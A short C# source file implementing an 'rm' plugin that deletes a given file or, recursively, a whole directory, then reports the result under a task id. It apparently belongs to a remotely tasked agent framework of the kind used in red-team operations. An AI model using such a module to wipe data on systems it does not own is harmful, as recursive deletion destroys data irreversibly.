using PluginBase;
using System;
using System.Collections.Generic;
using System.IO;

namespace Plugins
{
    public class Plugin : AthenaPlugin
    {
        public override string Name => "rm";
        public override void Execute(Dictionary<string, object> args)
        {
            try
            {
                if (args.ContainsKey("path"))
                {
                    FileAttributes attr = File.GetAttributes(((string)args["path"]).Replace("\"", ""));

                    // Check if Directory
                    if (attr.HasFlag(FileAttributes.Directory))
                    {
                        Directory.Delete(((string)args["path"]).Replace("\"", ""), true);
                    }
                    else
                    {
                        File.Delete((string)args["path"]);
                    }

                    PluginHandler.AddResponse(new ResponseResult
                    {
                        completed = "true",
                        user_output = "Deleted: " + ((string)args["path"]).Replace("\"", ""),
                        task_id = (string)args["task-id"],
                    });
                }
                else
                {

                    PluginHandler.AddResponse(new ResponseResult
                    {
                        completed = "true",
                        user_output = "Please specify a file to delete!",
                        task_id = (string)args["task-id"],
                        status = "error"
                    });
                }
            }
            catch (Exception e)
            {

                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
                return;
            }
        }
    }
}
